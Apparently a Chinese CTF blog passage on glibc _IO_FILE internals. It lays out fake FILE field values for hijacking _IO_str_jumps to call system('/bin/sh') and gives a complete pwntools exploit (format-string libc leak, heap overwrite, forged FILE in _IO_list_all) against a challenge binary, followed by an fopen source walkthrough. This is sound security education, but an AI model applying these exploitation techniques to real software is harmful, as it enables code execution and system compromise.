class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">const struct _IO_jump_t _IO_str_jumps libio_vtable =</span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>一般可以利用_IO_str_finish 与 _IO_str_overflow，同时也是前者更方便利用，定义如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_IO_str_finish (FILE *fp, int dummy)</span><br><span class="line">&#123;</span><br><span class="line">  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base); # call qword ptr [fp+0E8h]</span><br><span class="line">  fp-&gt;_IO_buf_base = NULL;</span><br><span class="line">  _IO_default_finish (fp, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_str_finish需要满足<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_flags = (binsh_in_libc + 0x10) &amp; ~1</span><br><span class="line">_IO_buf_base = binsh_addr</span><br><span class="line">_freeres_list = 0x2</span><br><span class="line">_freeres_buf = 0x3</span><br><span class="line">_mode = -1</span><br><span class="line">vtable = _IO_str_finish - 0x18</span><br><span class="line">fp+0xe8 -&gt; system_addr</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_str_overflow (FILE *fp, int c)</span><br><span class="line">&#123;</span><br><span class="line">  int flush_only = c == EOF;</span><br><span class="line">  size_t pos;</span><br><span class="line">  if (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      return flush_only ? 0 : EOF;</span><br><span class="line">  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */         // step 1</span><br><span class="line">return EOF;</span><br><span class="line">      else</span><br><span class="line">&#123;</span><br><span class="line">  char *new_buf;</span><br><span class="line">  char *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">  size_t old_blen = _IO_blen (fp);</span><br><span class="line">  size_t new_size = 2 * old_blen + 100;</span><br><span class="line">  if (new_size &lt; old_blen)</span><br><span class="line">    return EOF;</span><br><span class="line">  new_buf = malloc (new_size);</span><br><span class="line">  if (new_buf == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      /*  __ferror(fp) = 1; */</span><br><span class="line">      return EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  if (old_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      memcpy (new_buf, old_buf, old_blen);</span><br><span class="line">      free (old_buf);</span><br><span class="line">      /* Make sure _IO_setb won&apos;t try to delete _IO_buf_base. */</span><br><span class="line">      fp-&gt;_IO_buf_base = NULL;</span><br><span class="line">    &#125;</span><br><span class="line">  memset (new_buf + old_blen, &apos;\0&apos;, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">  _IO_setb (fp, new_buf, new_buf + new_size, 1);</span><br><span class="line">  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  if (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (unsigned char) c;</span><br><span class="line">  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  return c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><p>_IO_str_overflow需要满足<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_flags = 0</span><br><span class="line">_IO_write_base = 0</span><br><span class="line">_IO_write_ptr = (binsh_in_libc_addr -100) / 2 +1</span><br><span class="line">_IO_buf_end = (binsh_in_libc_addr -100) / 2 </span><br><span class="line">_freeres_list = 0x2</span><br><span class="line">_freeres_buf = 0x3</span><br><span class="line">_mode = -1</span><br><span class="line">vtable = _IO_str_jumps - 0x18</span><br></pre></td></tr></table></figure></p><h1 id="利用实例2"><a href="#利用实例2" class="headerlink" title="利用实例2"></a>利用实例2</h1><h2 id="echo-from-your-heart"><a href="#echo-from-your-heart" class="headerlink" title="echo from your heart"></a>echo from your heart</h2><h2 id="方向-3"><a href="#方向-3" class="headerlink" title="方向"></a>方向</h2><p>有点迷/尝试使用的fake_file2也没有成功，在unlink的时候就中断了。</p><p>_flags = 0<br>_IO_write_base &lt; _IO_write_ptr<br>_IO_buf_base = binsh<br>_mode &lt;= 0<br>vtable = _IO_str_jumps - 8<br>fp+0xe8 -&gt; system_addr</p><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><p>基本上就是那个hctf中的printf，程序执行流基本一致</p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;./echo_from_your_heart&apos;)</span><br><span class="line">elf = ELF(&apos;./echo_from_your_heart&apos;)</span><br><span class="line">libc = ELF(&apos;/glibc/glibc-2.24/debug_x64/lib/libc-2.24.so&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">elf = ELF(&apos;./echo_from_your_heart&apos;)</span><br><span class="line">#libc=ELF(&apos;&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get(size,word):</span><br><span class="line">    sh.sendlineafter(&apos;word: &apos;,str(size))</span><br><span class="line">    sh.sendlineafter(&apos;word: &apos;,word)</span><br><span class="line"></span><br><span class="line">get(0x20,&quot;%lx.&quot;*8+&quot;%lx&quot;)</span><br><span class="line">sh.recvuntil(&apos;echo: &apos;)</span><br><span class="line">for i in range(8):</span><br><span class="line">    sh.recvuntil(&apos;.&apos;)</span><br><span class="line">#print sh.recv()</span><br><span class="line">libc.base = int(&apos;0x&apos;+sh.recvuntil(&apos;\n&apos;,drop=True),16) - 0x1fcc9</span><br><span class="line">print hex(libc.base)</span><br><span class="line">io_list_all = libc.base + libc.symbols[&apos;_IO_list_all&apos;]</span><br><span class="line">system = libc.base + libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh = libc.base + libc.search(&apos;/bin/sh\x00&apos;).next()</span><br><span class="line">io_str_jumps = libc.base + libc.symbols[&apos;_IO_str_jumps&apos;]</span><br><span class="line">success(&quot;binsh_addr: &quot;+hex(binsh))</span><br><span class="line">#sh.recv()</span><br><span class="line">get(0x20,&apos;a&apos;*0x20+p64(0)+p64(0xfa1))</span><br><span class="line">get(0x1000,&apos;bbbb&apos;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">fake_file = p64(0)+p64(0x61)</span><br><span class="line">fake_file += p64(0)+p64(io_list_all-0x10)  # read_end &amp; read_base</span><br><span class="line">fake_file += p64(2)+p64(3)                 # write_base &lt; write_ptr</span><br><span class="line">fake_file += p64(0)+p64(binsh)             # write_end &amp; buf_base</span><br><span class="line">fake_file += &apos;\0&apos;*0x98#fake_file.ljust(0xd8,&apos;\0&apos;)  # use ljust will be detected why?</span><br><span class="line"></span><br><span class="line">pay = fake_file </span><br><span class="line">pay += p64(io_str_jumps-8)                 # vtable_ptr</span><br><span class="line">pay += p64(0) + p64(system)</span><br><span class="line"></span><br><span class="line">fake_file2 = p64(0)+p64(0x61)</span><br><span class="line">fake_file2 += p64(0)*2</span><br><span class="line">fake_file2 += p64(0)+p64((binsh-100)/2+1)  # write_base &amp; write_ptr</span><br><span class="line">fake_file2 += p64(0)*2</span><br><span class="line">fake_file2 += p64((binsh-100)/2)           # buf_end</span><br><span class="line">fake_file2 += &apos;\0&apos;*0x60</span><br><span class="line">fake_file2 += p64(2)+p64(3)                # freeres_list &amp; freeres_buf</span><br><span class="line">fake_file2 += p64(0)*0x20</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">pay2 = fake_file2</span><br><span class="line">pay2 += p64(io_str_jumps-0x18)</span><br><span class="line"></span><br><span class="line">get(0x10,&apos;d&apos; * 0x10 + pay)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#get(0x20,&apos;a&apos;*0x20+fake_file)</span><br><span class="line">sleep(1)</span><br><span class="line">sh.sendlineafter(&apos;word: &apos;,&apos;20&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> file </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>_IO_FILE 源码分析</title>
      <link href="/2019/07/08/io-file-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
      <url>/2019/07/08/io-file-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<p><em>_IO_File 是个比较神奇的东西，而且用起来比较方便，因此花点时间捋一下它的源码，方便后面的精进</em></p><p>这里使用glibc 2.23的源码进行调试，需要注意的是2.23版本之后的vtable添加了检查，这里调试的是没有检查的，加了debug symbol的glibc。源码与编译方式如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//gcc -Wl,-dynamic-linker /glibc/glibc-2.23/debug_x64/lib/ld-linux-x86-64.so.2 -o iofile -g iofile.c</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">FILE*fp1=fopen(&quot;test1&quot;,&quot;wb+&quot;);</span><br><span class="line"></span><br><span class="line">char data1[20];</span><br><span class="line">fread(data1,1,20,fp1);</span><br><span class="line"></span><br><span class="line">    FILE*fp2=fopen(&quot;test2&quot;,&quot;wb&quot;);</span><br><span class="line"></span><br><span class="line">char data2[20]=&#123;&quot;abcdefghij1234567890&quot;&#125;;</span><br><span class="line">fwrite(data2,1,20,fp2);</span><br><span class="line"></span><br><span class="line">fclose(fp1);</span><br><span class="line">    fclose(fp2);</span><br><span class="line">return 0;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h1><h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><p>malloc为结构体分配内存空间。</p><p>_IO_no_init 对FILE结构体进行初始化。</p><p>_IO_file_init将结构体链接进_IO_list_all链表。</p><p>_IO_file_fopen执行系统调用打开文件。</p><p>返回句柄。</p><h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><h3 id="fopen-gt-IO-new-fopen"><a href="#fopen-gt-IO-new-fopen" class="headerlink" title="fopen-&gt;_IO_new_fopen"></a>fopen-&gt;_IO_new_fopen</h3><p>跟进去,发现是_IO_new_fopen函数，在libio/iofopen.c中。（这里展示的不是2.23的代码，所以与下面调试时的代码会有所偏差）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_new_fopen (const char *filename, const char *mode)</span><br><span class="line">&#123;</span><br><span class="line">  return __fopen_internal (filename, mode, 1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>继续跟进__fopen_internal</p><h4 id="fopen-internal"><a href="#fopen-internal" class="headerlink" title="__fopen_internal"></a>__fopen_internal</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">__fopen_internal (const char *filename, const char *mode, int is32)</span><br><span class="line">&#123;</span><br><span class="line">  struct locked_FILE</span><br><span class="line">  &#123;</span><br><span class="line">    struct _IO_FILE_plus fp;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line">#endif</span><br><span class="line">    struct _IO_wide_data wd;</span><br><span class="line">  &#125; *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));</span><br><span class="line"></span><br><span class="line">  if (new_f == NULL)</span><br><span class="line">    return NULL;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line">#endif</span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, 0, 0, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);    //对file结构体new_f进行初始化。</span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;                             // 设置vtable为_IO_file_jumps</span><br><span class="line">  _IO_new_file_init_internal (&amp;new_f-&gt;fp);                              // 将file结构体链接进去_IO_list_all</span><br><span class="line">  if (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != NULL)</span><br><span class="line">    return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  free (new_f);</span><br><span class="line">  return NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到先申请了一个locked_FILE 结构体，其内部有三个结构体，分别为<em>fp = _IO_FILE_plus,</em>lock = _IO_lock_t,*wd = _IO_wide_data<br>太大了就不贴出来了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print new_f</span><br><span class="line">$3 = (struct locked_FILE *) 0x602010</span><br><span class="line">pwndbg&gt; x/20gx 0x602010-0x10</span><br><span class="line">0x602000:0x00000000000000000x0000000000000231</span><br><span class="line">0x602010:0x00000000000000000x0000000000000000</span><br><span class="line">0x602020:0x00000000000000000x0000000000000000</span><br><span class="line">0x602030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602040:0x00000000000000000x0000000000000000</span><br><span class="line">0x602050:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><h5 id="IO-no-init"><a href="#IO-no-init" class="headerlink" title="_IO_no_init"></a>_IO_no_init</h5><p>继续跟进,_IO_no_init 对file结构体进行初始化。这里2.23版本是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">   _IO_no_init (&amp;new_f-&gt;fp.file, 0, 0, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line">#else</span><br><span class="line">   _IO_no_init (&amp;new_f-&gt;fp.file, 1, 0, NULL, NULL);</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><p>进入函数内部，该函数位于/libio/genops.c中，开始时进入_IO_old_init (fp, flags)，对fp结构体部分初始化，绝大多数为空，返回后主要对fp-&gt;_wide_data结构体进行了初始化。</p><p>返回后设置vtable为_IO_file_jumps。</p><h5 id="IO-file-init"><a href="#IO-file-init" class="headerlink" title="_IO_file_init"></a>_IO_file_init</h5><p>继续运行，调用_IO_file_init (&amp;new_f-&gt;fp)，这里位于/libio/fileops.c;</p><p>将前面创建的file结构体放入_IO_list_all中。可以看到主体是调用的_IO_link_in(fp)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_IO_file_init (struct _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  /* POSIX.1 allows another file handle to be used to change the position</span><br><span class="line">     of our file descriptor.  Hence we actually don&apos;t know the actual</span><br><span class="line">     position before we do the first fseek (and until a following fflush). */</span><br><span class="line">  fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class="line">  fp-&gt;file._flags |= CLOSED_FILEBUF_FLAGS;</span><br><span class="line"></span><br><span class="line">  _IO_link_in (fp);</span><br><span class="line">  fp-&gt;file._fileno = -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="IO-link-in"><a href="#IO-link-in" class="headerlink" title="_IO_link_in"></a>_IO_link_in</h6><p>跟进该函数,又回到了genops.c中，看到开始检查flag的标志位是否是_IO_LINKED，因为FILE结构体是通过_IO_list_all的单链表进行组织管理的，所以如果不在链表中便对其进行相应的处理，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_IO_link_in (struct _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  if ((fp-&gt;file._flags &amp; _IO_LINKED) == 0)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (FILE *) fp;</span><br><span class="line">      _IO_flockfile ((FILE *) fp);</span><br><span class="line">#endif</span><br><span class="line">      fp-&gt;file._chain = (FILE *) _IO_list_all;</span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">      _IO_funlockfile ((FILE *) fp);</span><br><span class="line">      run_fp = NULL;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (0);</span><br><span class="line">#endif</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>查看下_IO_list_all申请的结构体,即前面三个结构体中第一个结构体。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print *_IO_list_all</span><br><span class="line">$5 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72538996, </span><br><span class="line">    _IO_read_ptr = 0x0, </span><br><span class="line">    _IO_read_end = 0x0, </span><br><span class="line">    _IO_read_base = 0x0, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x0, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x7ffff7dd6540 &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">    _fileno = -1, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x6020f0, </span><br><span class="line">    _offset = -1, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x602100, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 0, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7ffff7dd46e0 &lt;__GI__IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>函数返回到__fopen_internal中，进入一个判断<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != NULL)</span><br><span class="line">    return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br></pre></td></tr></table></figure></p><h4 